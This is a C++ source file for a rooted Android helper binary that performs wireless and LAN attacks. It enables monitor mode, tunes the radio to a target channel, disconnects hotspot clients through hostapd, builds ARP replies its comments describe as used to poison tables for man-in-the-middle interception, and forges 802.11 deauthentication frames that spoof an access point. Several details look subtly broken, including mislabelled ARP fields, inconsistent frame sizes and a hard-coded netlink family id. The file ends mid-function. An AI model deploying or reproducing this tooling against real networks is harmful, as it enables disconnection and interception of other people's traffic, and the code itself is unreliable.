// zsraw — privileged helper.
//
// WHY A SEPARATE BINARY
//   On Android, `su` starts a *new* process with uid 0; it does not raise the
//   privileges of the calling app process. AF_PACKET / AF_INET SOCK_RAW sockets
//   can therefore only be opened from a process that was itself started by su.
//   So the raw-socket features live here, and the app launches this binary with
//     su -c "<libdir>/zsraw <op> <args>"
//   Results are streamed back as one JSON object per line on stdout.
//
// FEATURES THAT STILL NEED MORE THAN ROOT
//   * 802.11 injection additionally needs the wlan driver in monitor mode with
//     injection support. `caps` reports what is actually available rather than
//     pretending, and the UI surfaces the reason.
#include "zs_dns.h"
#include "zs_tls.h"
#include "zs_sniff.h"

#include <arpa/inet.h>
#include <errno.h>
#include <dirent.h>
#include <fcntl.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/rtnetlink.h>
#ifndef IFF_AP
#define IFF_AP 0x2000  // soft-AP mode; older bionic headers omit it
#endif
#include <net/if_arp.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <poll.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <time.h>
#include <unistd.h>

#include <algorithm>
#include <map>
#include <string>
#include <vector>

// Not every libc pulls this out of <linux/if_ether.h>.
#ifndef ETH_P_IEEE80211_RADIOTAP
#define ETH_P_IEEE80211_RADIOTAP 0x001b5
#endif

// ---------------------------------------------------------------- utilities
static volatile sig_atomic_t g_stop = 0;
static void onSig(int) { g_stop = 1; }

static std::string jesc(const std::string& s) {
  std::string o;
  for (unsigned char c : s) {
    switch (c) {
      case '"':  o += "\\\""; break;
      case '\\': o += "\\\\"; break;
      case '\n': o += "\\n";  break;
      case '\r': break;
      case '\t': o += "\\t";  break;
      default:
        if (c < 0x20) { char b[8]; snprintf(b, sizeof b, "\\u%04x", c); o += b; }
        else o += (char)c;
    }
  }
  return o;
}
static std::string J(const std::string& s) { return "\"" + jesc(s) + "\""; }

static void emit(const std::string& s) {
  fputs(s.c_str(), stdout);
  fputc('\n', stdout);
  fflush(stdout);
}

static long long nowMs() {
  struct timespec ts;
  clock_gettime(CLOCK_MONOTONIC, &ts);
  return (long long)ts.tv_sec * 1000 + ts.tv_nsec / 1000000;
}

static std::string trim(const std::string& s) {
  size_t a = s.find_first_not_of(" \t\r\n");
  if (a == std::string::npos) return "";
  size_t b = s.find_last_not_of(" \t\r\n");
  return s.substr(a, b - a + 1);
}

static std::vector<std::string> split(const std::string& s, char d) {
  std::vector<std::string> o;
  std::string c;
  for (char ch : s) { if (ch == d) { o.push_back(c); c.clear(); } else c += ch; }
  o.push_back(c);
  return o;
}

static bool readFile(const std::string& p, std::string& o) {
  FILE* f = fopen(p.c_str(), "r");
  if (!f) return false;
  char buf[512];
  size_t n;
  o.clear();
  while ((n = fread(buf, 1, sizeof buf, f)) > 0) o.append(buf, n);
  fclose(f);
  o = trim(o);
  return true;
}

static bool runCmd(const std::string& cmd, std::string& out) {
  FILE* p = popen(cmd.c_str(), "r");
  if (!p) return false;
  char buf[512];
  out.clear();
  size_t n;
  while ((n = fread(buf, 1, sizeof buf, p)) > 0) out.append(buf, n);
  int rc = pclose(p);
  out = trim(out);
  return rc == 0;
}

static bool containsStr(const std::string& hay, const std::string& needle) {
  return hay.find(needle) != std::string::npos;
}

static bool startsWith(const std::string& s, const std::string& p) {
  return s.size() >= p.size() && s.compare(0, p.size(), p) == 0;
}

static bool isMac(const std::string& s) {
  unsigned b[6];
  return s.size() >= 17 &&
         sscanf(s.c_str(), "%x:%x:%x:%x:%x:%x", &b[0], &b[1], &b[2], &b[3], &b[4],
                &b[5]) == 6;
}

static std::string lower(std::string s) {
  for (auto& c : s) if (c >= 'A' && c <= 'Z') c += 32;
  return s;
}

static std::string upper(std::string s) {
  for (auto& c : s) if (c >= 'a' && c <= 'z') c -= 32;
  return s;
}

// mac -> ip, read from the kernel neighbour table. Under uid 0 this is the full
// table, which is what turns a bare station MAC into something a human can
// recognise. Entries the kernel has not resolved yet are simply absent.
// /proc/net/arp can be enormous on a hotspot: a busy soft AP fills the table
// with unresolved entries whose hardware address is all zeroes, one per lease
// seen. Those are placeholders, not stations, and the number of them is easily
// in the hundreds, so an all-zero or otherwise unused address is dropped here
// rather than shown to the user as a phantom client.
static std::vector<std::pair<std::string, std::string>> readArpPairs() {
  std::vector<std::pair<std::string, std::string>> out;
  std::string tbl;
  if (!readFile("/proc/net/arp", tbl)) return out;
  auto lines = split(tbl, '\n');
  for (size_t i = 1; i < lines.size(); i++) {
    // Columns are space-padded, so split() yields empty fields between them;
    // the empty ones are dropped before indexing.
    std::vector<std::string> f;
    for (auto& tok : split(lines[i], ' ')) {
      if (!tok.empty()) f.push_back(tok);
    }
    if (f.size() < 4) continue;
    std::string ip = f[0], mac = lower(f[3]);
    if (ip.empty() || ip == "0.0.0.0") continue;
    if (!isMac(mac)) continue;
    // 00:00:00:00:00:00 is what an unresolved entry looks like, and so is any
    // address whose every octet is zero.
    bool anySet = false;
    for (char ch : mac)
      if (ch >= '1' && ch <= '9') { anySet = true; break; }
    if (!anySet) continue;
    out.push_back({ip, mac});
  }
  return out;
}

// Real monitor-mode detection.
//
// The flag word in /sys/class/net/<if>/flags has no "monitor" bit: 0x40 is
// IFF_RUNNING, so testing that bit made every interface that was merely up
// look like a monitor -- and every deauth/injection attempt passed the gate
// while the driver silently dropped the frames. nl80211 exposes the real
// interface type, so ask iw for it.
// Ask the kernel for the interface's ARP hardware type. A mac80211 monitor
// interface reports ARPHRD_IEEE80211_RADIOTAP (23); managed and AP interfaces
// report ARPHRD_IEEE80211 (801). Done over rtnetlink so it works on a phone
// that ships no iw binary at all.
static int ifHwType(const std::string& ifn) {
  unsigned idx = if_nametoindex(ifn.c_str());
  if (!idx) return -1;
  int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
  if (fd < 0) return -1;
  struct sockaddr_nl sa{};
  sa.nl_family = AF_NETLINK;
  if (bind(fd, (struct sockaddr*)&sa, sizeof sa) != 0) { close(fd); return -1; }
  struct {
    struct nlmsghdr nh;
    struct ifinfomsg ifi;
  } q{};
  q.nh.nlmsg_len = NLMSG_LENGTH(sizeof q.ifi);
  q.nh.nlmsg_type = RTM_GETLINK;
  q.nh.nlmsg_flags = NLM_F_REQUEST;
  q.ifi.ifi_family = AF_UNSPEC;
  q.ifi.ifi_index = (int)idx;
  int type = -1;
  if (send(fd, &q, q.nh.nlmsg_len, 0) > 0) {
    char buf[8192];
    ssize_t n = recv(fd, buf, sizeof buf, 0);
    for (struct nlmsghdr* h = (struct nlmsghdr*)buf; NLMSG_OK(h, (unsigned)n);
         h = NLMSG_NEXT(h, n)) {
      if (h->nlmsg_type != RTM_NEWLINK) continue;
      struct ifinfomsg* ifi = (struct ifinfomsg*)NLMSG_DATA(h);
      // Only this interface counts: a radiotap interface elsewhere on the
      // device says nothing about whether this one is in monitor mode.
      if ((unsigned)ifi->ifi_index != idx) continue;
      type = ifi->ifi_type;
      break;
    }
  }
  close(fd);
  return type;
}

// Reads one link's flag word over rtnetlink. `idx` is bound into the request so
// the kernel answers with that interface only, and the reply is matched on the
// index again: a stray IFF_AP anywhere on the device must not be mistaken for
// a property of the interface being asked about.
static unsigned ifFlags(unsigned idx) {
  if (!idx) return 0;
  int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
  if (fd < 0) return 0;
  struct sockaddr_nl sa{};
  sa.nl_family = AF_NETLINK;
  if (bind(fd, (struct sockaddr*)&sa, sizeof sa) != 0) { close(fd); return 0; }
  struct {
    struct nlmsghdr nh;
    struct ifinfomsg ifi;
  } q{};
  q.nh.nlmsg_len = NLMSG_LENGTH(sizeof q.ifi);
  q.nh.nlmsg_type = RTM_GETLINK;
  q.nh.nlmsg_flags = NLM_F_REQUEST;
  q.ifi.ifi_family = AF_UNSPEC;
  q.ifi.ifi_index = (int)idx;
  unsigned flags = 0;
  if (send(fd, &q, q.nh.nlmsg_len, 0) > 0) {
    char buf[8192];
    ssize_t n = recv(fd, buf, sizeof buf, 0);
    for (struct nlmsghdr* h = (struct nlmsghdr*)buf; NLMSG_OK(h, (unsigned)n);
         h = NLMSG_NEXT(h, n)) {
      if (h->nlmsg_type != RTM_NEWLINK) continue;
      struct ifinfomsg* ifi = (struct ifinfomsg*)NLMSG_DATA(h);
      if ((unsigned)ifi->ifi_index != idx) continue;
      flags = ifi->ifi_flags;
      break;
    }
  }
  close(fd);
  return flags;
}

static unsigned ifFlags(unsigned idx);
static std::string hostapdCtrlDir(const std::string& ifn);

// True when this interface is a soft AP, i.e. the phone's own hotspot. Such an
// interface cannot be moved to monitor mode; hostapd has to do the
// deauthentication instead.
//
// IFF_AP is not a dependable signal: on a MediaTek X6873 running Android 15 the
// hotspot interface ap0 reports flags 0x1003, with 0x40 (IFF_AP) clear, while
// wlan0 reports 0x1203. The control socket hostapd created for that exact
// interface is what actually distinguishes an AP from a station, so it is
// checked alongside the flag.
static bool isApMode(const std::string& ifn) {
  if (!hostapdCtrlDir(ifn).empty()) return true;
  return (ifFlags(if_nametoindex(ifn.c_str())) & IFF_AP) != 0;
}

static bool isMonitorMode(const std::string& ifn) {
  if (ifHwType(ifn) == ARPHRD_IEEE80211_RADIOTAP) return true;
  // Keep the iw path for phones that do ship it: it is the documented route.
  std::string out;
  if (runCmd("iw dev " + ifn + " info", out)) return containsStr(out, "type monitor");
  return false;
}

// Bring an interface down/up around a mode change; mac80211 refuses a direct
// managed->monitor transition while the interface is up.
static bool setIfaceUp(const std::string& ifn, bool up) {
  int fd = socket(AF_INET, SOCK_DGRAM, 0);
  if (fd < 0) return false;
  struct ifreq r{};
  snprintf(r.ifr_name, sizeof r.ifr_name, "%s", ifn.c_str());
  if (ioctl(fd, SIOCGIFFLAGS, &r) != 0) { close(fd); return false; }
  if (up) r.ifr_flags |= (IFF_UP | IFF_RUNNING);
  else r.ifr_flags &= ~(IFF_UP | IFF_RUNNING);
  bool ok = ioctl(fd, SIOCSIFFLAGS, &r) == 0;
  close(fd);
  return ok;
}

// --------------------------------------------------------------- nl80211 core
// One generic-netlink round trip, so every nl80211 verb below is the same
// request/response plumbing with different attributes. A phone ships no `iw`,
// and installing it into a rooted system is not something the app can rely on,
// so this speaks the protocol directly.
namespace nl {

const uint32_t kFamily = 40;              // nl80211's generic-netlink family
const uint16_t kSetInterface = 6;
const uint16_t kNewInterface = 44;        // monitor vif beside the station
const uint16_t kDelInterface = 45;

const uint16_t kAttrIfIndex = 1;
const uint16_t kAttrIfName = 2;
const uint16_t kAttrIfType = 4;
const uint16_t kAttrWiphyFreq = 5;
const uint16_t kAttrWdev = 3;
const uint16_t kAttrIfaceType = 9;        // nested, for NEW_INTERFACE

const int kMonitor = 8;                   // NL80211_IFTYPE_MONITOR

/** Incremental nl80211 attribute buffer. */
struct Attrs {
  char body[512];
  size_t off = 0;

  void put(uint16_t type, const void* data, uint16_t len) {
    if (off + 4 + ((len + 3) & ~3u) > sizeof body) return;
    struct nlattr a{static_cast<uint16_t>(len), type};
    memcpy(body + off, &a, sizeof a);
    off += sizeof a;
    memcpy(body + off, data, len);
    off += (len + 3) & ~3u;
  }
  void u32(uint16_t type, uint32_t v) { put(type, &v, sizeof v); }
  void str(uint16_t type, const std::string& s) {
    put(type, s.c_str(), (uint16_t)s.size() + 1);
  }
  /** Raw bytes for an already-encoded attribute (used for nesting). */
  void raw(uint16_t type, const void* data, size_t len) {
    put(type, data, (uint16_t)len);
  }
};

/**
 * Sends one nl80211 command and waits for its ACK.
 *
 * @return "" on success, otherwise the kernel's errno as text. Note the
 *         asymmetry: these commands produce no positive reply. Success is a
 *         NLMSG_ERROR whose embedded errno is 0 -- that message is an ACK, not
 *         an error -- so "did it work" is only answerable from that one field.
 */
static std::string cmd(uint8_t nlcmd, const Attrs& a) {
  int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
  if (fd < 0) return std::string("socket: ") + strerror(errno);
  struct sockaddr_nl sa{};
  sa.nl_family = AF_NETLINK;
  if (bind(fd, (struct sockaddr*)&sa, sizeof sa) != 0) {
    close(fd);
    return std::string("bind: ") + strerror(errno);
  }

  struct {
    struct nlmsghdr nh;
    struct { uint8_t cmd; uint8_t version; uint16_t reserved; } genl;
  } req{};
  req.nh.nlmsg_len = NLMSG_LENGTH(sizeof(req.genl) + a.off);
  req.nh.nlmsg_type = kFamily;
  req.nh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
  req.nh.nlmsg_seq = 1;
  req.genl.cmd = nlcmd;
  req.genl.version = 1;
  memcpy((char*)&req + NLMSG_HDRLEN + sizeof(req.genl), a.body, a.off);

  std::string err = "no reply from the kernel";
  if (sendto(fd, &req, req.nh.nlmsg_len, 0, (struct sockaddr*)&sa, sizeof sa) > 0) {
    char buf[2048];
    ssize_t n = recv(fd, buf, sizeof buf, 0);
    if (n <= 0) {
      err = "the kernel did not acknowledge the request";
    } else {
      struct nlmsghdr* h = (struct nlmsghdr*)buf;
      if (h->nlmsg_type == NLMSG_ERROR) {
        int e = 0;
        if ((size_t)n >= NLMSG_LENGTH(sizeof(int))) e = *(int*)NLMSG_DATA(h);
        err = e == 0 ? "" : ("nl80211 error " + std::to_string(e) + " (" + strerror(e) + ")");
      } else {
        err = "unexpected reply";
      }
    }
  } else {
    err = std::string("send: ") + strerror(errno);
  }
  close(fd);
  return err;
}

}  // namespace nl

// nl80211 SET_INTERFACE over generic netlink: the same thing iw does, without
// needing iw installed. Returns the kernel's error string on failure.
static std::string nl80211SetIftype(const std::string& ifn, int iftype) {
  unsigned idx = if_nametoindex(ifn.c_str());
  if (!idx) return "no such interface";
  nl::Attrs a;
  a.u32(nl::kAttrIfIndex, idx);
  a.u32(nl::kAttrIfType, (uint32_t)iftype);
  return nl::cmd(nl::kSetInterface, a);
}

/**
 * Park a monitor-mode interface on one channel.
 *
 * This is the difference between a deauthentication frame that reaches its
 * target and one transmitted into empty air. A monitor-mode radio does not
 * scan: it sits on a single channel and stays there until told otherwise. The
 * target access point is on exactly one channel, so if the radio is anywhere
 * else every frame leaves the device and arrives nowhere.
 *
 * Nothing reports that failure. sendto() succeeds and the frame counter ticks
 * up, because the radio *is* transmitting perfectly -- just on a frequency
 * where nobody is listening. That silent wrong-frequency case is the single
 * most common reason a deauth tool appears to do nothing on a real device.
 *
 * @param mhz centre frequency in MHz, or 0 to keep the current channel
 * @return "" on success, otherwise the kernel's error
 */
static std::string nl80211SetFreq(const std::string& ifn, int mhz) {
  unsigned idx = if_nametoindex(ifn.c_str());
  if (!idx) return "no such interface";
  if (mhz <= 0) return "";
  nl::Attrs a;
  a.u32(nl::kAttrIfIndex, idx);
  // The kernel expresses centre frequency in units of 0.5 MHz.
  a.u32(nl::kAttrWiphyFreq, (uint32_t)(mhz * 2));
  return nl::cmd(nl::kSetInterface, a);
}

/**
 * Create a monitor-mode interface alongside an existing one.
 *
 * Why this exists: a wireless interface cannot be a station and a monitor at
 * the same time. Converting wlan0 itself drops the phone off the network it
 * was on, which breaks the very scan that identified the access point in the
 * first place. A second virtual interface lets wlan0 stay associated and gives
 * the sniffing and injection somewhere else to happen.
 *
 * Not every driver permits it. Android vendor wlan drivers are frequently
 * built around a single interface their own supplicant wants to own, and some
 * refuse a second virtual interface outright. Callers must treat failure here
 * as "fall back to converting the main interface", not as fatal.
 *
 * @param out receives the new interface's name on success
 * @return "" on success, otherwise the kernel's error
 */
static std::string createMonitorVif(const std::string& phyName, const std::string& ifnName,
                                    unsigned ifindex, std::string* out) {
  // Wiphy name, plus a nested IFACE_TYPE group carrying the new name and type.
  nl::Attrs ifaceType;
  ifaceType.str(nl::kAttrIfName, ifnName);
  ifaceType.u32(nl::kAttrWdev, ifindex);
  ifaceType.u32(nl::kAttrIfType, (uint32_t)nl::kMonitor);

  nl::Attrs a;
  a.str(nl::kAttrIfName, phyName);
  a.raw(nl::kAttrIfaceType, ifaceType.body, ifaceType.off);
  std::string err = nl::cmd(nl::kNewInterface, a);
  if (err.empty() && out) *out = ifnName;
  return err;
}

/** Remove a virtual interface created above, leaving the radio as it was found. */
static std::string deleteVif(const std::string& ifnName) {
  unsigned idx = if_nametoindex(ifnName.c_str());
  if (!idx) return "";   // already gone
  nl::Attrs a;
  a.u32(nl::kAttrIfIndex, idx);
  return nl::cmd(nl::kDelInterface, a);
}

/**
 * The phy name backing an interface, e.g. "phy0".
 *
 * NL80211_CMD_NEW_INTERFACE is addressed to a wiphy, not to an interface, and
 * the only portable way to get that name without parsing netlink dumps is the
 * sysfs symlink mac80211 maintains. Returns "" when the driver does not
 * expose one.
 */
static std::string phyNameOf(const std::string& ifn) {
  std::string path = "/sys/class/net/" + ifn + "/phy80211/name";
  FILE* f = fopen(path.c_str(), "r");
  if (!f) return "";
  char buf[64] = {0};
  if (!fgets(buf, sizeof buf, f)) { fclose(f); return ""; }
  fclose(f);
  std::string s(buf);
  while (!s.empty() && (s.back() == '\n' || s.back() == '\r')) s.pop_back();
  return s;
}

/**
 * Put a monitor interface on the frequency the target AP is actually using.
 *
 * Every deauthentication path funnels through here first, because the failure
 * it prevents is invisible. sendL2() succeeding only means the driver accepted
 * the frame into the transmit queue; on the wrong frequency the radio is
 * perfectly happy to send it, and the counter climbs, and nothing arrives. The
 * UI would report a running attack that is really just noise on an empty
 * channel.
 *
 * Takes a centre frequency in MHz rather than a channel number, because channel
 * numbers are not unique across bands: "channel 1" is 2412 MHz on 2.4 GHz and
 * 5955 MHz on 6 GHz, and there is no band to disambiguate with once a single
 * integer is all that crosses the boundary. The scan already reports the
 * frequency itself, so passing it through is both shorter and unambiguous.
 *
 * Called with 0 it does nothing at all, which is the right behaviour when the
 * caller has no frequency: listening on whatever the radio is already on is
 * still worth a try, and tuning to a guessed channel would be strictly worse.
 *
 * @param mhz centre frequency, or 0 for "unknown, leave the radio alone"
 * @return "" on success or when there was nothing to do; otherwise the reason
 *         the radio could not be tuned, which callers surface as a warning
 *         rather than a hard error -- the run may still work if the radio was
 *         already on the right channel, and refusing outright would be less
 *         useful than trying.
 */
static std::string tuneFreq(const std::string& ifn, int mhz) {
  return nl80211SetFreq(ifn, mhz);
}

// ------------------------------------------------------------------ hostapd
// hostapd owns the soft-AP interface, so on ap0 the only way to drop a client
// is its control socket. These wrappers talk to it through hostapd_cli, trying
// every socket location Android has used for the hotspot over the releases.

// Directory holding the control socket hostapd listens on for `ifn`, or "" when
// the hotspot is not running. AOSP names the socket "control" under
// /data/misc/wifi/softap; vendor builds (MediaTek here) instead run one hostapd
// per radio with the socket named after the interface, under
// /data/vendor/wifi/hostapd/ctrl/ap0. Both layouts are probed. The socket is a
// unix socket, not a directory, and hostapd_cli wants the *directory*.
static std::string hostapdCtrlDir(const std::string& ifn) {
  static const char* kDirs[] = {
      "/data/misc/wifi/softap",
      "/data/misc/apexdata/com.android.wifi",
      "/data/misc/wifi/softap/hostapd",
      "/data/misc/wifi/wlan0",
      "/data/vendor/wifi/hostapd/ctrl",
      "/data/vendor/wifi/hostapd",
  };
  for (const char* d : kDirs) {
    // A unix socket, stat()'d in-process: shelling out to "ls" or "test -S" is
    // wrong here, because listing both candidate names in one command exits
    // non-zero when only one of them exists -- which is the normal case.
    for (const std::string& sock : {std::string("control"), ifn}) {
      struct stat st{};
      if (stat((std::string(d) + "/" + sock).c_str(), &st) == 0 &&
          S_ISSOCK(st.st_mode))
        return d;
    }
  }
  return "";
}

// False when no control socket answered at all.
static bool hostapdCli(const std::string& ifn, const std::string& args,
                       std::string& out) {
  std::string dir = hostapdCtrlDir(ifn);
  if (dir.empty()) return false;
  return runCmd("hostapd_cli -p " + dir + " " + args + " 2>/dev/null", out);
}

// Drops one station. hostapd answers "OK" or "FAIL <reason>" and exits 0 either
// way, so the reply has to be inspected rather than the exit status.
static bool hostapdDeauth(const std::string& ifn, const std::string& mac,
                          std::string& out) {
  if (!hostapdCli(ifn, "deauthenticate " + mac, out)) return false;
  return out.find("FAIL") == std::string::npos;
}

struct Sta {
  std::string mac;
  std::string ip;
  int signal = 0;
  bool hasSignal = false;
};

// Associated stations. list_sta is the one command every hostapd build
// implements; all_sta adds signal level but needs driver station stats, so it
// is read on a best-effort basis.
static std::vector<Sta> hostapdStations(const std::string& ifn) {
  std::vector<Sta> out;
  std::string macs;
  if (!hostapdCli(ifn, "list_sta", macs)) return out;
  for (auto& line : split(macs, '\n')) {
    Sta s;
    s.mac = lower(trim(line));
    if (!isMac(s.mac)) continue;
    out.push_back(s);
  }
  std::string detail;
  if (!hostapdCli(ifn, "all_sta", detail)) return out;
  // all_sta prints one block per station: the MAC, then flags=..., signal=-54...
  std::string current;
  for (auto& line : split(detail, '\n')) {
    std::string t = trim(line);
    if (isMac(t)) { current = lower(t); continue; }
    if (current.empty() || !startsWith(t, "signal=")) continue;
    int sig = atoi(t.c_str() + 7);
    for (auto& s : out)
      if (s.mac == current) { s.signal = sig; s.hasSignal = true; }
  }
  return out;
}

static std::string hexOf(const unsigned char* p, size_t n) {
  static const char* d = "0123456789abcdef";
  std::string o;
  o.reserve(n * 3);
  for (size_t i = 0; i < n; i++) {
    if (i) o += ' ';
    o += d[p[i] >> 4];
    o += d[p[i] & 15];
  }
  return o;
}

static bool putMac(unsigned char* p, const std::string& mac) {
  unsigned b[6];
  if (sscanf(mac.c_str(), "%x:%x:%x:%x:%x:%x", &b[0], &b[1], &b[2], &b[3],
             &b[4], &b[5]) != 6)
    return false;
  for (int i = 0; i < 6; i++) p[i] = (uint8_t)b[i];
  return true;
}

static std::vector<std::string> listDir(const std::string& path) {
  std::vector<std::string> out;
  DIR* d = opendir(path.c_str());
  if (!d) return out;
  while (dirent* e = readdir(d)) {
    std::string n = e->d_name;
    if (n == "." || n == "..") continue;
    out.push_back(n);
  }
  closedir(d);
  return out;
}

// ------------------------------------------------------------------- netinfo
static std::string macOf(const std::string& ifn) {
  std::string s;
  if (!readFile("/sys/class/net/" + ifn + "/address", s)) return "";
  return lower(s);
}

// The source MAC of a received frame, in the same "aa:bb:cc:dd:ee:ff" form
// macOf() produces. Read straight off the frame rather than looked up: the
// address a packet came *from* is the one that sent it, which is exactly what
// an injected reply has to be addressed to, and it is correct for a host the
// ARP cache has not caught up on yet.
static std::string frameSrcMac(const unsigned char* f) {
  char buf[18];
  snprintf(buf, sizeof buf, "%02x:%02x:%02x:%02x:%02x:%02x", f[6], f[7], f[8],
           f[9], f[10], f[11]);
  return std::string(buf);
}

// IPv4 helpers -----------------------------------------------------------
static int netmaskToPrefix(const std::string& mask) {
  struct in_addr a{};
  if (inet_pton(AF_INET, mask.c_str(), &a) != 1) return 24;
  uint32_t m = ntohl(a.s_addr);
  int p = 0;
  while (m & 0x80000000u) { p++; m <<= 1; }
  return p;
}

static std::string defaultGateway() {
  std::string tbl;
  if (!readFile("/proc/net/route", tbl)) return "";
  auto lines = split(tbl, '\n');
  for (size_t i = 1; i < lines.size(); i++) {
    auto f = split(lines[i], ' ' );
    if (f.size() < 3) continue;
    std::string dest = f[1], gw = f[2];
    if (dest != "00000000") continue;
    unsigned long v = strtoul(gw.c_str(), nullptr, 16);
    if (!v) continue;
    struct in_addr a{};
    a.s_addr = htonl((uint32_t)v);
    char b[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &a, b, sizeof b);
    return b;
  }
  return "";
}

static std::string ifaceIp(const std::string& ifn) {
  int fd = socket(AF_INET, SOCK_DGRAM, 0);
  if (fd < 0) return "";
  struct ifreq r{};
  strncpy(r.ifr_name, ifn.c_str(), IFNAMSIZ - 1);
  if (ioctl(fd, SIOCGIFADDR, &r) == 0) {
    struct sockaddr_in* s = (struct sockaddr_in*)&r.ifr_addr;
    char b[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &s->sin_addr, b, sizeof b);
    ::close(fd);
    return b;
  }
  ::close(fd);
  return "";
}

static std::string ifaceMask(const std::string& ifn) {
  int fd = socket(AF_INET, SOCK_DGRAM, 0);
  if (fd < 0) return "255.255.255.0";
  struct ifreq r{};
  strncpy(r.ifr_name, ifn.c_str(), IFNAMSIZ - 1);
  std::string m = "255.255.255.0";
  if (ioctl(fd, SIOCGIFNETMASK, &r) == 0) {
    struct sockaddr_in* s = (struct sockaddr_in*)&r.ifr_addr;
    char b[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &s->sin_addr, b, sizeof b);
    m = b;
  }
  ::close(fd);
  return m;
}

static std::string hexToStr(const std::string& mac) {
  unsigned b[6];
  if (sscanf(mac.c_str(), "%x:%x:%x:%x:%x:%x", &b[0], &b[1], &b[2], &b[3], &b[4],
             &b[5]) != 6)
    return "";
  char out[18];
  snprintf(out, sizeof out, "%02x:%02x:%02x:%02x:%02x:%02x", b[0], b[1], b[2], b[3],
           b[4], b[5]);
  return out;
}

// ------------------------------------------------------------- packet socket
struct Raw {
  int fd = -1;
  int ifindex = 0;
  std::string ifname;
  std::string mac;

  bool openPacket() {
    fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (fd < 0) return false;
    ifindex = if_nametoindex(ifname.c_str());
    if (ifindex == 0) { ::close(fd); fd = -1; return false; }
    mac = macOf(ifname);
    return true;
  }
  bool openRawIp(int proto) {
    fd = socket(AF_INET, SOCK_RAW, proto);
    if (fd < 0) return false;
    ifindex = if_nametoindex(ifname.c_str());
    return true;
  }
  // L2 send; `llProto` 0 keeps the kernel default (ETH_P_ALL).
  bool sendL2(const unsigned char* frame, size_t len, const std::string& dstMac,
              uint16_t llProto) {
    struct sockaddr_ll s{};
    s.sll_family = AF_PACKET;
    s.sll_protocol = htons(llProto ? llProto : ETH_P_ALL);
    s.sll_ifindex = ifindex;
    std::string dm = hexToStr(dstMac);
    if (llProto == 0 && !dm.empty()) {
      unsigned b[6];
      sscanf(dm.c_str(), "%x:%x:%x:%x:%x:%x", &b[0], &b[1], &b[2], &b[3], &b[4],
             &b[5]);
      for (int i = 0; i < 6; i++) s.sll_addr[i] = (uint8_t)b[i];
      s.sll_halen = 6;
    } else {
      s.sll_halen = 0;   // monitor-mode injection: no L2 address
    }
    ssize_t n = sendto(fd, frame, len, 0, (struct sockaddr*)&s, sizeof s);
    return n == (ssize_t)len;
  }
  // Frame length, or 0 when the window closed with nothing in it. The callers
  // that only care whether *something* arrived keep working: 0 is the only
  // falsy value this can hand back.
  ssize_t recvL2(unsigned char* buf, size_t cap, int timeoutMs) {
    struct pollfd p{fd, POLLIN, 0};
    if (poll(&p, 1, timeoutMs) <= 0) return 0;
    ssize_t n = recv(fd, buf, cap, 0);
    return n > 0 ? n : 0;
  }
  ~Raw() { if (fd >= 0) ::close(fd); }
};

static uint16_t cksum(const void* data, size_t len, uint32_t init) {
  const uint8_t* p = (const uint8_t*)data;
  uint32_t sum = init;
  while (len > 1) { sum += (p[0] << 8) | p[1]; p += 2; len -= 2; }
  if (len) sum += p[0] << 8;
  while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
  return (uint16_t)~sum;
}

// ---------------------------------------------------------------------- ARP
// Builds "gratuitous ARP reply": tells the LAN that `claimIp` lives at
// `claimMac`. Used both to poison (MITM) and to repair the table.
static size_t buildArp(const std::string& ethSrc, const std::string& ethDst,
                       const std::string& arpTargetMac, uint32_t senderIp,
                       uint32_t targetIp, uint16_t op, unsigned char* out) {
  memset(out, 0, 42);
  putMac(out, ethDst);
  putMac(out + 6, ethSrc);
  out[12] = 0x08; out[13] = 0x06;                 // EtherType IPv4
  out[14] = 0x00; out[15] = 0x01;                 // htons(ETH_P_ARP)
  out[16] = 0x08; out[17] = 0x00;                 // htype Ethernet
  out[18] = 0x06; out[19] = 0x04;                 // ptype IPv4
  out[20] = 0x00; out[21] = 0x01;                 // hlen/plen
  out[22] = (uint8_t)(op >> 8); out[23] = (uint8_t)(op & 0xff);
  putMac(out + 24, ethSrc);                       // SHA
  memcpy(out + 30, &senderIp, 4);                 // SPA
  putMac(out + 34, arpTargetMac);                 // THA
  memcpy(out + 40, &targetIp, 4);                 // TPA
  return 42;
}

// ------------------------------------------------------------------ 802.11
// 20-byte radiotap header, then a 26-byte deauth/disassoc management frame.
//
// Field order is 802.11 mgmt: FC(2) dur(2) DA(6) SA(6) BSSID(6) seq(2) reason(1).
// Both SA and BSSID carry the AP address — that is what makes the frame look
// like it came from the access point, which is the whole point of a deauth.
#define RADIOTAP_F_LEN 20
static size_t build80211Deauth(const std::string& bssid, const std::string& dest,
                               uint8_t reason, unsigned char* out) {
  memset(out, 0, RADIOTAP_F_LEN + 26);
  // radiotap
  out[0] = 0;            // version
  out[1] = 0;            // padding
  out[2] = RADIOTAP_F_LEN;  // length
  out[3] = 0x00;         // present flags (none)
  // frame control: mgmt, subtype deauth(12)
  out[RADIOTAP_F_LEN + 0] = 0xC0;
  out[RADIOTAP_F_LEN + 1] = 0x0C;
  out[RADIOTAP_F_LEN + 2] = 0x00;   // duration
  putMac(out + RADIOTAP_F_LEN + 4, dest);     // DA = client being targeted
  putMac(out + RADIOTAP_F_LEN + 10, bssid);   // SA = spoofed AP
  putMac(out + RADIOTAP_F_LEN + 16, bssid);   // BSSID = the AP
  out[RADIOTAP_F_LEN + 22] = 0x00;         // sequence << 4
  out[RADIOTAP_F_LEN + 23] = 0x00;
  out[RADIOTAP_F_LEN + 24] = reason;       // reason code
  return RADIOTAP_F_LEN + 26;
}

static size_t build80211Auth(const std::string& bssid, const std::string& dest,
                             unsigned char* out) {
  memset(out, 0, RADIOTAP_F_LEN + 30);
  out[0] = 0; out[1] = 0; out[2] = RADIOTAP_F_LEN; out[3] = 0;
  out[RADIOTAP_F_LEN + 0] = 0xB0;   // mgmt subtype auth(11)
